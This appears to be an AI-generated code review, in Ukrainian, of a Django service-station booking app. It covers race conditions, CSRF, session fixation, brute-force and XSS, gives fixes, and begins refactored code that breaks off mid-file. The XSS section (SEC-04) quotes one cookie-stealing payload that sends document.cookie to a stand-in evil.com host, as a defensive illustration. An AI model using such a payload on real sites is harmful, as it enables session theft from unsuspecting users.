# 🔍 Мультиагентний Код-Ревью: Karro (STO Application)

> **Проект**: Django-додаток для пошуку та управління станціями технічного обслуговування  
> **Стек**: Django 4.2 / MySQL / Vanilla JS / Chart.js / Leaflet  
> **Дата ревью**: 2026-07-05  

---

## 1. Краткое Резюме (Executive Summary)

| Метрика | Значення |
|---------|----------|
| **Загальна оцінка** | **6.5 / 10** |
| **Критичні проблеми** | 5 |
| **Уразливості безпеки** | 7 |
| **Архітектурні зауваження** | 9 |

**Головні ризики одним реченням**: Кастомна система автентифікації (без `django.contrib.auth`) створює критичну поверхню атаки через відсутність захисту від brute-force, відсутність session fixation protection, а також race conditions у фінансових операціях — усе це може призвести до несанкціонованого доступу та фінансових втрат.

> [!IMPORTANT]
> Проект має добру базову структуру та продуману валідацію, але кастомна модель `User` поза стандартною системою автентифікації Django — це архітектурне рішення, яке створює **каскад проблем безпеки**, описаних нижче.

---

## 2. Критичні Проблеми та Баги (Critical Bugs & Logic Errors)

### 🐛 CRIT-01: Race Condition у фінансових операціях (оплата зарплат)

- **Описание проблемы**: У [pay_salary_view](file:///e:/sto/accounting/views.py#L291-L331) перевірка балансу та його оновлення відбуваються *не атомарно*. При одночасних запитах два процеси можуть прочитати один і той же баланс і обидва провести виплату — подвоюючи реальну суму.

- **Локація**: [accounting/views.py:307-315](file:///e:/sto/accounting/views.py#L307-L315)

- **Як відтворити**: Два швидкі POST-запити на виплату 1000 грн при балансі 1000 грн — обидва пройдуть.

- **Як виправити**:
```python
from django.db import transaction
from django.db.models import F

@login_required_session
@role_required('station')
@require_POST
def pay_salary_view(request):
    user = get_current_user(request)
    employee_id = request.POST.get('employee_id')
    employee = get_object_or_404(Employee, pk=employee_id, station__user=user)

    amount_str = request.POST.get('amount', '0.00')
    try:
        amount = Decimal(amount_str)
    except (ValueError, InvalidOperation):
        messages.error(request, "Некоректна сума виплати.")
        return _redirect_to_dashboard(employee.station.pk)

    if amount <= 0:
        messages.error(request, "Сума виплати має бути більшою за нуль.")
        return _redirect_to_dashboard(employee.station.pk)

    try:
        with transaction.atomic():
            # SELECT ... FOR UPDATE для запобігання race condition
            balance = SalaryBalance.objects.select_for_update().get(employee=employee)
            if amount > balance.current_balance:
                messages.error(
                    request,
                    f"Сума виплати ({amount} грн) перевищує доступний баланс "
                    f"({balance.current_balance} грн)."
                )
                return _redirect_to_dashboard(employee.station.pk)

            balance.total_paid = F('total_paid') + amount
            balance.save(update_fields=['total_paid'])

            Transaction.objects.create(
                station=employee.station,
                type='expense',
                category='salary',
                amount=amount,
                description=f"Виплата зарплати працівнику: "
                            f"{employee.full_name} ({employee.position})",
                employee=employee,
                date=datetime.date.today()
            )
        messages.success(
            request,
            f"Виплата {amount} грн працівнику {employee.full_name} "
            f"успішно проведена."
        )
    except Exception as e:
        messages.error(request, f"Помилка при виплаті зарплати: {e}")

    return _redirect_to_dashboard(employee.station.pk)
```

---

### 🐛 CRIT-02: Race Condition при завершенні ремонту (complete_booking_view)

- **Описание проблемы**: У [complete_booking_view](file:///e:/sto/accounting/views.py#L392-L466) перевірка статусу `booking.status == 'completed'` та подальший `booking.save()` не обгорнуті в `transaction.atomic()` + `select_for_update()`. Два одночасних запити можуть обидва пройти перевірку та створити подвійний дохід.

- **Локація**: [accounting/views.py:392-466](file:///e:/sto/accounting/views.py#L392-L466)

- **Як виправити**: Обгорнути у `transaction.atomic()` і блокувати рядок booking через `select_for_update()`:
```python
with transaction.atomic():
    booking = Booking.objects.select_for_update().get(pk=booking_id, station__user=user)
    if booking.status in ('completed', 'cancelled'):
        # ... повернути помилку
    # ... решта логіки
```

---

### 🐛 CRIT-03: Нарахування комісії працівнику без атомарності

- **Описание проблемы**: У тій же функції [complete_booking_view](file:///e:/sto/accounting/views.py#L448-L460), оновлення `sb.total_earned += commission` не використовує `F()` вирази та `select_for_update()`. При конкурентних запитах одна з комісій буде перезаписана.

- **Локація**: [accounting/views.py:454-456](file:///e:/sto/accounting/views.py#L454-L456)

- **Як виправити**:
```python
sb = SalaryBalance.objects.select_for_update().get(employee=employee)
sb.total_earned = F('total_earned') + commission
sb.save(update_fields=['total_earned'])
```

---

### 🐛 CRIT-04: `CSRF_COOKIE_HTTPONLY = True` блокує AJAX-запити з JS

- **Описание проблемы**: У [settings.py:19](file:///e:/sto/sto/settings.py#L19) встановлено `CSRF_COOKIE_HTTPONLY = True`, але у [notifications.js](file:///e:/sto/static/js/notifications.js#L12-L25) та [station_detail.js](file:///e:/sto/static/js/station_detail.js#L160) JavaScript-код намагається зчитати `csrftoken` з cookies через `document.cookie`. Коли `HttpOnly=True`, JavaScript **не має доступу** до цього cookie.

- **Чому це працює зараз**: Django за замовчуванням також шукає CSRF token в заголовку `X-CSRFToken`, а `station_detail.js` бере token з DOM-елемента `csrfmiddlewaretoken`. Але `notifications.js` покладається **тільки** на cookie — і це **зламано**.

- **Локація**: [settings.py:19](file:///e:/sto/sto/settings.py#L19), [notifications.js:12-25](file:///e:/sto/static/js/notifications.js#L12-L25)

- **Як виправити**: 

Варіант A — змінити `CSRF_COOKIE_HTTPONLY = False` (стандартна конфігурація Django);

Варіант B — передавати CSRF token через мета-тег у base.html:
```html
<meta name="csrf-token" content="{{ csrf_token }}">
```
```javascript
function getCSRFToken() {
    return document.querySelector('meta[name="csrf-token"]')?.content;
}
```

---

### 🐛 CRIT-05: `create_booking_api` не перевіряє, чи user є клієнтом

- **Описание проблемы**: Ендпоінт [create_booking_api](file:///e:/sto/main/views.py#L491-L568) перевіряє тільки наявність `user_id` в сесії, але **не перевіряє роль**. Власник СТО може створювати заявки від свого імені як «клієнт», що порушує бізнес-логіку.

- **Локація**: [main/views.py:492-496](file:///e:/sto/main/views.py#L492-L496)

- **Як виправити**:
```python
client = User.objects.get(user_id=user_id)
if client.role != 'client':
    return JsonResponse(
        {'status': 'error', 'message': 'Тільки клієнти можуть створювати заявки'},
        status=403
    )
```

---

## 3. Уразливості Безпеки (Security Vulnerabilities)

### 🔓 SEC-01: Відсутність захисту від Brute-Force атак на логін

- **Рівень загрози**: 🔴 **Critical**

- **Описание уязвимости**: У [login_view](file:///e:/sto/main/views.py#L112-L131) відсутні будь-які обмеження на кількість спроб входу. Атакуючий може виконувати необмежену кількість спроб підбору пароля.

- **Приклад атаки**: Скрипт, що посилає тисячі POST-запитів з різними паролями до `/login/`, автоматично перебираючи паролі зі словника.

- **Рішення**: Додати rate limiting через `django-ratelimit` або кастомний middleware:
```python
from functools import lru_cache
from collections import defaultdict
from time import time

# Простий in-memory rate limiter (для production використовуйте Redis)
_login_attempts = defaultdict(list)
MAX_ATTEMPTS = 5
LOCKOUT_SECONDS = 300  # 5 хвилин

def _check_rate_limit(identifier: str) -> bool:
    """Повертає True якщо заблоковано."""
    now = time()
    # Очищуємо старі спроби
    _login_attempts[identifier] = [
        t for t in _login_attempts[identifier]
        if now - t < LOCKOUT_SECONDS
    ]
    if len(_login_attempts[identifier]) >= MAX_ATTEMPTS:
        return True
    _login_attempts[identifier].append(now)
    return False

def login_view(request):
    if request.method == 'POST':
        ip = request.META.get('REMOTE_ADDR', '')
        if _check_rate_limit(ip):
            messages.error(request, 'Забагато спроб. Спробуйте через 5 хвилин.')
            return render(request, 'main/login.html')
        # ... решта логіки
```

---

### 🔓 SEC-02: Відсутність Session Fixation Protection

- **Рівень загрози**: 🔴 **Critical**

- **Описание уязвимости**: При успішному логіні в [login_view](file:///e:/sto/main/views.py#L123-L125) та [register_view](file:///e:/sto/main/views.py#L180) **не відбувається ротація session ID**. Django's `django.contrib.auth.login()` автоматично викликає `request.session.cycle_key()`, але кастомна система — ні. Це дозволяє атаку session fixation.

- **Приклад атаки**: Зловмисник підставляє жертві відомий session ID (через URL або XSS), жертва логіниться — і зловмисник має доступ до її аккаунту.

- **Рішення**: Додати `request.session.cycle_key()` після логіну:
```python
def _set_session_data(request, user):
    """Записує ідентифікаційні дані користувача в сесію."""
    request.session.cycle_key()  # <-- Захист від session fixation
    request.session['user_id'] = user.user_id
    request.session['user_name'] = user.full_name
    request.session['user_role'] = user.role
```

---

### 🔓 SEC-03: Кастомна модель User без `AbstractBaseUser` — системний ризик

- **Рівень загрози**: 🟠 **High**

- **Описание уязвимости**: Модель [User](file:///e:/sto/main/models.py#L9-L41) — це звичайна `models.Model`, а не `AbstractBaseUser` / `AbstractUser`. Це означає:
  - Не використовується `AUTH_USER_MODEL` → Django admin не може працювати з нею як з моделлю автентифікації
  - Не працюють стандартні бекенди автентифікації
  - Не доступні сигнали `user_logged_in`, `user_logged_out`
  - Не працює `@login_required` стандартний декоратор
  - Необхідно вручну реалізовувати всі аспекти безпеки, які Django надає «з коробки»

- **Рішення**: В ідеалі — мігрувати на `AbstractBaseUser`. Якщо це неможливо (навчальний проект), то принаймні покрити всі missing security primitives: session rotation, rate limiting, password complexity.

---

### 🔓 SEC-04: XSS через Leaflet popup у пошуку станцій

- **Рівень загрози**: 🟠 **High**

- **Описание уязвимости**: У [search.js:37-38](file:///e:/sto/static/js/search.js#L37-L38) змінні `s.name`, `s.city`, `s.address` вставляються в HTML через template literal **без екранування**. Якщо назва СТО містить `<script>alert(1)</script>`, це виконається в браузері всіх користувачів на сторінці пошуку.

- **Приклад атаки**: Власник СТО створює станцію з назвою `<img src=x onerror="document.location='http://evil.com/?c='+document.cookie">` — і збирає cookies всіх відвідувачів сторінки пошуку.

- **Локація**: [search.js:37-38](file:///e:/sto/static/js/search.js#L37-L38), [station_detail.js:76-77](file:///e:/sto/static/js/station_detail.js#L76-L77)

- **Рішення**: Додати функцію екранування (аналогічна `escapeHtml` з notifications.js) і використовувати її:
```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// В popup:
marker.bindPopup(`
    <div>
        <div>${escapeHtml(s.name)}</div>
        <div>${s.city ? escapeHtml(s.city) + ', ' : ''}${escapeHtml(s.address)}</div>
    </div>
`);
```

---

### 🔓 SEC-05: Відсутність перевірки `is_active` у `create_booking_api`

- **Рівень загрози**: 🟡 **Medium**

- **Описание уязвимости**: У [create_booking_api](file:///e:/sto/main/views.py#L492-L512) перевіряється тільки `user_id` з сесії, але **не перевіряється `is_active`**. `BanCheckMiddleware` перевіряє це, але тільки для стандартних GET-запитів до початку обробки view. Якщо middleware пройшов (сесія ще дійсна), а admin заблокував акаунт між middleware та view — запит пройде.

- **Рішення**: Додати перевірку в API:
```python
client = User.objects.get(user_id=user_id)
if not client.is_active:
    return JsonResponse(
        {'status': 'error', 'message': 'Ваш акаунт заблоковано'},
        status=403
    )
```

---

### 🔓 SEC-06: Missing `Content-Disposition` header sanitization у CSV export

- **Рівень загрози**: 🟡 **Medium**

- **Описание уязвимости**: У [export_transactions_csv](file:///e:/sto/accounting/views.py#L515) ім'я файлу формується з `station.name`, який контролюється користувачем. Якщо ім'я станції містить спеціальні символи (наприклад, `"` або `\n`), це може призвести до HTTP Header Injection.

- **Локація**: [accounting/views.py:515](file:///e:/sto/accounting/views.py#L515)

- **Рішення**:
```python
import re
safe_name = re.sub(r'[^\w\s-]', '', station.name).strip()[:50]
response['Content-Disposition'] = f'attachment; filename="{safe_name}_report_{start_date}_{end_date}.csv"'
```

---

### 🔓 SEC-07: `SECRET_KEY` у `.env` файлі є небезпечним для production

- **Рівень загрози**: 🟢 **Low** (якщо тільки для розробки)

- **Описание уязвимости**: У [.env](file:///e:/sto/.env#L1) `SECRET_KEY` містить реальний ключ. Хоча `.env` додано до `.gitignore`, слід переконатися, що цей конкретний файл ніколи не потрапляв у git history. Також ключ має символи, які можуть бути проблемними в деяких shell-середовищах.

- **Рішення**: Згенерувати новий ключ через `python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"` і переконатися що старий ключ ніколи не потрапляв у git.

---

## 4. Архітектура, Оптимізація та Чистота Коду

### ⚡ ARCH-01: God View — `profile_view` обробляє 10+ різних POST-дій

- **Замечание**: Функція [profile_view](file:///e:/sto/main/views.py#L186-L482) — це 300 рядків коду з 10 різними `if action ==` гілками. Це порушує **SRP** (Single Responsibility Principle) та робить код важким для тестування та розуміння.

- **Рекомендація**: Розбити на окремі view-функції для кожної дії і маршрутизувати через URL або dispatch-словник:
```python
ACTION_HANDLERS = {
    'update_profile': handle_update_profile,
    'change_password': handle_change_password,
    'upload_avatar': handle_upload_avatar,
    'add_car': handle_add_car,
    'delete_car': handle_delete_car,
    'upload_car_photo': handle_upload_car_photo,
    'update_station': handle_update_station,
    'add_service': handle_add_service,
    'delete_service': handle_delete_service,
    'update_booking_status': handle_update_booking_status,
}

@login_required_session
def profile_view(request):
    user = get_current_user(request)
    if user is None:
        return redirect('login')

    if request.method == 'POST':
        action = request.POST.get('action', '')
        handler = ACTION_HANDLERS.get(action)
        if handler:
            return handler(request, user)
        messages.warning(request, 'Невідома дія.')
        return redirect('profile')

    context = _build_profile_context(user, request)
    return render(request, 'main/profile.html', context)
```

---

### ⚡ ARCH-02: N+1 запит у `dashboard_view` — повне сканування транзакцій у Python

- **Замечание**: У [dashboard_view](file:///e:/sto/accounting/views.py#L84-L91) суми доходів/витрат підраховуються через Python-цикл `sum(t.amount for t in period_transactions if t.type == 'income')`. Це завантажує **всі транзакції в пам'ять** замість того, щоб виконати агрегацію в БД.

- **Локація**: [accounting/views.py:84-91](file:///e:/sto/accounting/views.py#L84-L91)

- **Рекомендація**: Використати Django ORM aggregation:
```python
from django.db.models import Sum, Q, DecimalField
from django.db.models.functions import Coalesce

aggregated = period_transactions.aggregate(
    total_income=Coalesce(
        Sum('amount', filter=Q(type='income')),
        Decimal('0.00'),
        output_field=DecimalField()
    ),
    total_expense=Coalesce(
        Sum('amount', filter=Q(type='expense')),
        Decimal('0.00'),
        output_field=DecimalField()
    ),
)
total_income = aggregated['total_income']
total_expense = aggregated['total_expense']
```

---

### ⚡ ARCH-03: Повторні DB-запити для `period_transactions`

- **Замечание**: У [dashboard_view](file:///e:/sto/accounting/views.py#L78-L158) QuerySet `period_transactions` обчислюється ліниво, але ітерується кілька разів (для підрахунку метрик, для побудови графіків, для фільтрації таблиці). Кожна ітерація — це окремий SQL-запит.

- **Рекомендація**: Або використати `.values()` з агрегаціями у БД, або кешувати в `list()` один раз:
```python
# Один запит до БД, далі робота з пам'яттю
period_transactions_list = list(period_transactions)
```

---

### ⚡ ARCH-04: `avg_rating()` і `review_count()` у моделі `ServiceStation` — N+1

- **Замечание**: Методи [avg_rating()](file:///e:/sto/main/models.py#L75-L80) та [review_count()](file:///e:/sto/main/models.py#L82-L84) виконують окремі SQL-запити для **кожної** станції. На сторінці пошуку з 50 станціями це 100 додаткових запитів.

- **Локація**: [main/models.py:75-84](file:///e:/sto/main/models.py#L75-L84)

- **Рекомендація**: Ці методи *вже не використовуються* — у `search/views.py` використовуються анотації. Методи можна позначити як deprecated або видалити, щоб запобігти випадковому використанню.

---

### ⚡ ARCH-05: `BanCheckMiddleware` — SQL-запит на кожен HTTP-запит

- **Замечание**: [BanCheckMiddleware](file:///e:/sto/main/middleware.py#L5-L28) виконує `User.objects.only('is_active').get(pk=user_id)` **на кожному HTTP-запиті** авторизованого користувача — включаючи запити на статику, favicon, CSS, JS тощо.

- **Рекомендація**: Кешувати результат у сесії з TTL:
```python
import time

class BanCheckMiddleware:
    BAN_CHECK_TTL = 60  # Перевірка раз на хвилину

    def __call__(self, request):
        user_id = request.session.get('user_id')
        if user_id:
            last_check = request.session.get('_ban_check_ts', 0)
            if time.time() - last_check > self.BAN_CHECK_TTL:
                try:
                    user = User.objects.only('is_active').get(pk=user_id)
                    if not user.is_active:
                        request.session.flush()
                        messages.error(request, "Ваш акаунт заблоковано.")
                        return redirect('login')
                    request.session['_ban_check_ts'] = time.time()
                except User.DoesNotExist:
                    request.session.flush()
                    return redirect('login')

        return self.get_response(request)
```

---

### ⚡ ARCH-06: CSV export без пагінації — DoS ризик

- **Замечание**: Функція [export_transactions_csv](file:///e:/sto/accounting/views.py#L469-L532) не обмежує кількість записів. При великій кількості транзакцій це може вичерпати пам'ять сервера.

- **Рекомендація**: Додати ліміт або використовувати streaming response:
```python
from django.http import StreamingHttpResponse
import csv

def export_transactions_csv(request):
    # ... валідація ...

    def generate_csv():
        writer = csv.writer(Echo())
        writer.writerow(['Дата', 'Тип', 'Категорія', 'Сума', 'Опис', 'ID Заявки', 'Працівник'])
        for t in transactions.iterator(chunk_size=500):
            yield writer.writerow([...])

    response = StreamingHttpResponse(generate_csv(), content_type='text/csv')
    # ...
```

---

### ⚡ ARCH-07: Геокодування в синхронному запиті блокує процес

- **Замечание**: [geocode_address](file:///e:/sto/main/views.py#L91-L106) виконує HTTP-запит до зовнішнього API (Nominatim) синхронно під час POST-обробки. Якщо Nominatim повільний або недоступний — весь request зависне на 5 секунд (timeout).

- **Рекомендація**: Або виконувати це асинхронно через Celery/Django Q, або явно попереджувати користувача про можливу затримку, або зробити це на фронтенді через JavaScript Geocoding API.

---

### ⚡ ARCH-08: Дублювання логіки фільтрації у `dashboard_view` та `export_transactions_csv`

- **Замечание**: Логіка визначення дефолтного періоду (поточний місяць) та фільтрації транзакцій дублюється у [dashboard_view](file:///e:/sto/accounting/views.py#L47-L67) та [export_transactions_csv](file:///e:/sto/accounting/views.py#L491-L511).

- **Рекомендація**: Виділити в спільну utility-функцію:
```python
def _parse_date_range(request):
    """Парсить діапазон дат з GET-параметрів, дефолт — поточний місяць."""
    today = datetime.date.today()
    first_day = today.replace(day=1)
    _, last = calendar.monthrange(today.year, today.month)
    last_day = today.replace(day=last)

    start = request.GET.get('start_date')
    end = request.GET.get('end_date')
    try:
        start_date = datetime.datetime.strptime(start, "%Y-%m-%d").date() if start else first_day
    except ValueError:
        start_date = first_day
    try:
        end_date = datetime.datetime.strptime(end, "%Y-%m-%d").date() if end else last_day
    except ValueError:
        end_date = last_day

    return start_date, end_date
```

---

### ⚡ ARCH-09: Мінімальна вимога до пароля — лише довжина ≥ 6

- **Замечание**: У [register_view](file:///e:/sto/main/views.py#L156-L158) та [profile_view](file:///e:/sto/main/views.py#L261-L262) пароль перевіряється тільки на довжину ≥ 6 символів. Немає перевірки на складність, відсутність у словниках поширених паролів тощо. При цьому в `settings.py` визначені Django `AUTH_PASSWORD_VALIDATORS`, але вони **не використовуються** (бо кастомна модель User).

- **Рекомендація**: Підключити Django-валідатори вручну:
```python
from django.contrib.auth.password_validation import validate_password
from django.core.exceptions import ValidationError

try:
    validate_password(password)
except ValidationError as e:
    for error in e.messages:
        messages.error(request, error)
    return render(request, 'main/login.html', ctx)
```

---

## 5. Зведена Таблиця Всіх Проблем

| ID | Категорія | Критичність | Файл | Статус |
|----|-----------|------------|------|--------|
| CRIT-01 | Race Condition | 🔴 Critical | [accounting/views.py](file:///e:/sto/accounting/views.py#L291) | Потребує виправлення |
| CRIT-02 | Race Condition | 🔴 Critical | [accounting/views.py](file:///e:/sto/accounting/views.py#L392) | Потребує виправлення |
| CRIT-03 | Race Condition | 🔴 Critical | [accounting/views.py](file:///e:/sto/accounting/views.py#L454) | Потребує виправлення |
| CRIT-04 | CSRF + HttpOnly | 🔴 Critical | [settings.py](file:///e:/sto/sto/settings.py#L19) + [notifications.js](file:///e:/sto/static/js/notifications.js#L12) | Потребує виправлення |
| CRIT-05 | Missing Auth Check | 🟠 High | [main/views.py](file:///e:/sto/main/views.py#L492) | Потребує виправлення |
| SEC-01 | Brute-Force | 🔴 Critical | [main/views.py](file:///e:/sto/main/views.py#L112) | Потребує виправлення |
| SEC-02 | Session Fixation | 🔴 Critical | [main/views.py](file:///e:/sto/main/views.py#L78) | Потребує виправлення |
| SEC-03 | Custom Auth | 🟠 High | [main/models.py](file:///e:/sto/main/models.py#L9) | Архітектурний борг |
| SEC-04 | XSS | 🟠 High | [search.js](file:///e:/sto/static/js/search.js#L37) | Потребує виправлення |
| SEC-05 | Missing is_active | 🟡 Medium | [main/views.py](file:///e:/sto/main/views.py#L492) | Рекомендація |
| SEC-06 | Header Injection | 🟡 Medium | [accounting/views.py](file:///e:/sto/accounting/views.py#L515) | Рекомендація |
| SEC-07 | Secret Key | 🟢 Low | [.env](file:///e:/sto/.env#L1) | Перевірити |
| ARCH-01 | God View | 🟡 Medium | [main/views.py](file:///e:/sto/main/views.py#L186) | Рефакторинг |
| ARCH-02 | N+1 Query | 🟡 Medium | [accounting/views.py](file:///e:/sto/accounting/views.py#L84) | Оптимізація |
| ARCH-03 | Repeated QuerySet | 🟡 Medium | [accounting/views.py](file:///e:/sto/accounting/views.py#L78) | Оптимізація |
| ARCH-04 | N+1 Model Methods | 🟢 Low | [main/models.py](file:///e:/sto/main/models.py#L75) | Рефакторинг |
| ARCH-05 | Middleware DB Hit | 🟡 Medium | [main/middleware.py](file:///e:/sto/main/middleware.py#L14) | Оптимізація |
| ARCH-06 | CSV no limit | 🟡 Medium | [accounting/views.py](file:///e:/sto/accounting/views.py#L469) | Оптимізація |
| ARCH-07 | Sync Geocoding | 🟢 Low | [main/views.py](file:///e:/sto/main/views.py#L91) | Рефакторинг |
| ARCH-08 | Code Duplication | 🟢 Low | [accounting/views.py](file:///e:/sto/accounting/views.py#L47) | DRY |
| ARCH-09 | Weak Passwords | 🟡 Medium | [main/views.py](file:///e:/sto/main/views.py#L156) | Безпека |

---

## 6. Позитивні Сторони Проекту ✅

Цей ревью був би неповним без зазначення сильних сторін коду:

1. **Хешування паролів** — використовується `make_password` / `check_password` — паролі не зберігаються у відкритому вигляді ✅
2. **Валідація VIN** — регулярний вираз ISO 3779 з виключенням I, O, Q ✅  
3. **CSRF захист** — токени використовуються в формах та AJAX ✅
4. **Image upload validation** — перевірка content-type, розширення та розміру ✅
5. **Security headers** у production (HSTS, SSL redirect, SECURE_CONTENT_TYPE_NOSNIFF) ✅
6. **Logging** — помилки безпеки та request errors логуються ✅
7. **Тести** — наявні юніт-тести для ключових бізнес-процесів (booking, notifications, accounting) ✅
8. **Обмеження розміру upload** через `DATA_UPLOAD_MAX_MEMORY_SIZE` ✅
9. **XSS protection** у notifications.js через `escapeHtml()` ✅
10. **Ownership checks** — перевірка належності об'єктів поточному користувачу ✅

---

## 7. Пріоритетний План Дій

> [!CAUTION]
> **Першочергові дії** (виправити до деплою):

1. 🔴 Додати `request.session.cycle_key()` у `_set_session_data()` — **1 рядок, 2 хвилини** (SEC-02)
2. 🔴 Виправити `CSRF_COOKIE_HTTPONLY` або спосіб отримання токену у JS (CRIT-04)
3. 🔴 Обгорнути фінансові операції у `transaction.atomic()` + `select_for_update()` (CRIT-01, CRIT-02, CRIT-03)
4. 🔴 Додати rate limiting на логін (SEC-01)
5. 🟠 Додати `escapeHtml()` у search.js та station_detail.js (SEC-04)
6. 🟠 Додати перевірку ролі в `create_booking_api` (CRIT-05)

> [!TIP]
> **Довгострокові поліпшення** (спринт-by-спринт):

7. Рефакторинг `profile_view` → dispatch pattern (ARCH-01)
8. Оптимізація dashboard через DB aggregation (ARCH-02, ARCH-03)
9. Кешування BanCheckMiddleware (ARCH-05)
10. Підключення `AUTH_PASSWORD_VALIDATORS` (ARCH-09)

---

## 8. Итоговый Вариант Кода (Refactored Code)

Нижче наведено повністю виправлений та оптимізований код ключових файлів проекту із застосуванням усіх рекомендацій з цього ревью. Зміни позначені коментарями `# ✅ FIX:`.

---

### 8.1 `sto/settings.py` — Виправлення CSRF cookie (CRIT-04)

```python
from pathlib import Path
import os
from decouple import config, Csv

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = config('SECRET_KEY')
DEBUG = config('DEBUG', default=False, cast=bool)
ALLOWED_HOSTS = config('ALLOWED_HOSTS', default='127.0.0.1,localhost', cast=Csv())

# Налаштування сесій
SESSION_COOKIE_AGE = 86400
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = not DEBUG
SESSION_COOKIE_SAMESITE = 'Lax'

# Захист CSRF
# ✅ FIX (CRIT-04): Змінено на False, щоб JS міг читати CSRF cookie
# для AJAX-запитів (notifications.js, station_detail.js).
# Це стандартна конфігурація Django — cookie не містить sensitive data.
CSRF_COOKIE_HTTPONLY = False
CSRF_COOKIE_SECURE = not DEBUG
CSRF_COOKIE_SAMESITE = 'Lax'

# Захист з'єднання (тільки для production)
if not DEBUG:
    SECURE_SSL_REDIRECT = True
    SECURE_HSTS_SECONDS = 31536000
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD = True
    SECURE_CONTENT_TYPE_NOSNIFF = True

# Обмеження розміру завантажуваних файлів (захист від DoS)
DATA_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024
FILE_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024

LOGIN_URL = '/login/'

INSTALLED_APPS = [
    'accounting',
    'station',
    'search',
    'main',
    'unfold',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'main.middleware.BanCheckMiddleware',
]

ROOT_URLCONF = 'sto.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'sto.wsgi.application'

# Налаштування бази даних (MySQL / SQLite)
if config('USE_SQLITE', default=False, cast=bool):
    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.sqlite3',
            'NAME': BASE_DIR / 'db.sqlite3',
        }
    }
else:
    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.mysql',
            'NAME':     config('DB_NAME',     default='STO_app'),
            'USER':     config('DB_USER',     default='root'),
            'PASSWORD': config('DB_PASSWORD', default=''),
            'HOST':     config('DB_HOST',     default='localhost'),
            'PORT':     config('DB_PORT',     default='3306'),
        }
    }

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]

# Локалізація
LANGUAGE_CODE = 'uk'
TIME_ZONE = 'Europe/Kyiv'
USE_I18N = True
USE_TZ = True

# Статичні та медіа файли
STATIC_URL = 'static/'
STATICFILES_DIRS = [BASE_DIR / 'static']
STATIC_ROOT = BASE_DIR / 'staticfiles'

MEDIA_URL = '/media/'
MEDIA_ROOT = BASE_DIR / 'media'

# Логування помилок та загроз безпеки
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '[{asctime}] {levelname} {name} {message}',
            'style': '{',
        },
    },
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',
            'formatter': 'verbose',
        },
        'file': {
            'level': 'WARNING',
            'class': 'logging.FileHandler',
            'filename': BASE_DIR / 'logs' / 'security.log',
        },
    },
    'loggers': {
        'django.security': {
            'handlers': ['file'],
            'level': 'WARNING',
            'propagate': True,
        },
        'django.request': {
            'handlers': ['console', 'file'],
            'level': 'ERROR',
            'propagate': False,
        },
    },
}

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

# Налаштування інтерфейсу Django Unfold
UNFOLD = {
    "SITE_TITLE": "Karro Admin",
    "SITE_HEADER": "Karro",
    "DASHBOARD_CALLBACK": "main.dashboard.dashboard_callback",
}
```

---

### 8.2 `main/views.py` — Виправлення безпеки та архітектури

> [!NOTE]
> Нижче показані лише змінені або критичні функції з повним контекстом. Незмінені функції (`home`, `station_detail` тощо) залишаються як є.

```python
import logging
import os
import re
from collections import defaultdict
from datetime import date
from time import time
from urllib.parse import urlencode

import requests
from django.conf import settings as django_settings
from django.contrib import messages
from django.contrib.auth.hashers import make_password, check_password
# ✅ FIX (ARCH-09): Підключаємо стандартні Django-валідатори паролів
from django.contrib.auth.password_validation import validate_password
from django.core.exceptions import ValidationError
from django.shortcuts import render, redirect, get_object_or_404
from django.urls import reverse
from django.utils import timezone
from django.views.decorators.http import require_POST

from django.http import JsonResponse
import json
from .decorators import login_required_session
from .models import User, Car, Review, ServiceStation, Service, Booking, Notification

logger = logging.getLogger(__name__)

# Дозволені формати та обмеження розміру для зображень
ALLOWED_IMAGE_TYPES = {
    'image/jpeg': ['.jpg', '.jpeg'],
    'image/png': ['.png'],
    'image/webp': ['.webp'],
    'image/gif': ['.gif'],
}
MAX_IMAGE_SIZE_BYTES = 3 * 1024 * 1024

# ✅ FIX (SEC-01): Простий in-memory rate limiter для захисту від brute-force
_login_attempts = defaultdict(list)
MAX_LOGIN_ATTEMPTS = 5
LOGIN_LOCKOUT_SECONDS = 300  # 5 хвилин


def _check_login_rate_limit(identifier: str) -> bool:
    """Повертає True якщо IP заблоковано через перевищення кількості спроб."""
    now = time()
    _login_attempts[identifier] = [
        t for t in _login_attempts[identifier]
        if now - t < LOGIN_LOCKOUT_SECONDS
    ]
    if len(_login_attempts[identifier]) >= MAX_LOGIN_ATTEMPTS:
        return True
    _login_attempts[identifier].append(now)
    return False


def get_current_user(request):
    """Повертає об'єкт користувача з сесії або None."""
